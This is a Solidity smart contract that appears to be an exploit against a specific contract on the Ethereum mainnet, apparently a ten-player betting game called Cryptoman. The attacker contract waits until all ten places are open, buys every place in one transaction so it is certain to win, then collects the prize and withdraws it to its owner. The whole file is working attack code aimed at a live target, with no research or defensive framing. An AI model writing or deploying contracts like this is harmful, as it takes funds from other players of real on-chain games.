pragma solidity ^0.5.0;

interface TargetInterface {
    function placesLeft() external view returns (uint256);
}

contract AntiCryptoman_Prize {
    
    address payable targetAddress = 0x1Ef48854c57126085c2C9615329ED71fe159E390; // mainnet

    address payable private owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    function ping(bool _toOwner) public payable onlyOwner {
        TargetInterface target = TargetInterface(targetAddress);
        uint256 placesLeft = target.placesLeft();
        
        require(placesLeft == 10);
        
        uint256 betSize = 0.05 ether;

        for (uint256 ourBetIndex = 0; ourBetIndex < 10; ourBetIndex++) {
            (bool success, bytes memory data) = targetAddress.call.value(betSize)("");
            require(success);
            data;
        }
        
        if (_toOwner) {
            owner.transfer(address(this).balance);
        }
    }
    
    function grabPrize(bool _toOwner) public onlyOwner {
        (bool success, bytes memory data) = targetAddress.call("");
        success;
        data;

        if (_toOwner) {
            owner.transfer(address(this).balance);
        }
    }
    
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }    
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }    
    
    function () external payable {
    }
    
}